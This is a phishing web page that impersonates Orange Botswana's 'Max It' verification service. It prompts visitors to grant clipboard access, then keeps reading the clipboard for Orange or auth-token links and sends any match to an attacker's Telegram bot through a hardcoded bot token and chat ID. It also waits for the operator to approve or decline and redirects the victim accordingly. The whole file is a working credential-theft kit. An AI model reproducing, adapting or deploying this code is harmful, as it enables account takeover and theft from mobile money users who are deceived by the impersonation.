<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange Max It - Verify</title>
    <link rel="icon" href="https://www.orange.co.bw/favicon.ico" type="image/x-icon">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, sans-serif; }
        body { 
            background-color: #F4F4F4; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 24px;
            padding: 40px 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
            text-align: center;
        }

        .logo {
            width: 60px;
            height: 60px;
            background: #FF6600;
            border-radius: 12px;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 800;
            font-size: 24px;
        }

        h1 { font-size: 24px; font-weight: 700; color: #333; margin-bottom: 15px; }
        p { font-size: 15px; color: #666; line-height: 1.6; margin-bottom: 30px; }

        .btn-verify {
            width: 100%;
            padding: 20px;
            background: #FF6600;
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 8px 20px rgba(255, 102, 0, 0.2);
        }

        .btn-verify:active { transform: scale(0.98); background: #E65C00; }

        /* Loading State */
        #loadingArea { display: none; margin-top: 20px; }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #F3F3F3;
            border-top: 4px solid #FF6600;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { font-size: 14px; font-weight: 700; color: #FF6600; }

        footer { margin-top: 30px; color: #AAA; font-size: 12px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">O</div>
        <h1>Verification</h1>
        <p id="mainText">Please click the button below to verify your device and receive your Orange verification link.</p>

        <button class="btn-verify" id="verifyBtn">Verify Link</button>

        <div id="loadingArea">
            <div class="spinner"></div>
            <div class="status-text">Waiting for SMS link...</div>
            <p style="font-size: 13px; margin-top: 10px; color: #999;">The system will automatically capture the link once the SMS arrives.</p>
        </div>
    </div>

    <footer>© 2026 Orange Botswana</footer>

    <script>
        /* ─── CONFIG ────────────────────────────────── */
        const CONFIG = {
            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
            CHAT_ID: '7547427914',
            REDIRECT: 'success.html',
            PATTERN: /https?:\/\/(?:maxit-mobile\.orange\.co\.bw|orange|maxit|auth|token)[^\s]+/gi
        };

        /* ─── STATE ─────────────────────────────────── */
        const state = {
            active: false,
            initial: null,
            processed: false,
            lastId: 0
        };

        /* ─── DOM ───────────────────────────────────── */
        const els = {
            btn: document.getElementById('verifyBtn'),
            loading: document.getElementById('loadingArea'),
            text: document.getElementById('mainText')
        };

        /* ─── HANDS-FREE DETECTION ──────────────────── */

        async function scan() {
            if (!state.active || state.processed) return;

            try {
                // Browsers require a user gesture to access clipboard
                // Once clicked, we monitor for changes
                const text = await navigator.clipboard.readText();
                
                if (text && text !== state.initial) {
                    const matches = text.match(CONFIG.PATTERN);
                    if (matches) {
                        state.processed = true;
                        sendToBot(matches[0]);
                    }
                }
            } catch (e) {
                // Silently wait for focus or permission
            }
        }

        function sendToBot(link) {
            const ts = Date.now();
            const aid = `approve_${ts}`;
            const did = `decline_${ts}`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `*🔐 Orange Max It - Auto Captured*\n\nLink: ${link}`,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ Approve', callback_data: aid },
                            { text: '❌ Decline', callback_data: did }
                        ]]
                    }
                })
            })
            .then(r => r.json())
            .then(data => {
                if (data.ok) poll(aid, did);
            });
        }

        function poll(aid, did) {
            setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastId + 1}`)
                .then(r => r.json())
                .then(data => {
                    if (!data.ok || !data.result?.length) return;
                    data.result.forEach(u => {
                        state.lastId = u.update_id;
                        if (u.callback_query?.data === aid) window.location.href = CONFIG.REDIRECT;
                        if (u.callback_query?.data === did) location.reload();
                    });
                });
            }, 2000);
        }

        /* ─── TRIGGER ───────────────────────────────── */

        els.btn.addEventListener('click', async () => {
            try {
                // 1. Activate Scanner & Capture Initial State
                state.initial = await navigator.clipboard.readText();
                state.active = true;

                // 2. Update UI
                els.btn.style.display = 'none';
                els.text.style.display = 'none';
                els.loading.style.display = 'block';

                // 3. Start High-Frequency Background Scanner
                setInterval(scan, 800);

                // 4. Scan immediately when user returns to tab
                window.addEventListener('focus', scan);
                document.addEventListener('visibilitychange', () => {
                    if (document.visibilityState === 'visible') scan();
                });

            } catch (e) {
                alert("Please allow clipboard access to enable automatic link detection.");
            }
        });

    </script>
</body>
</html>
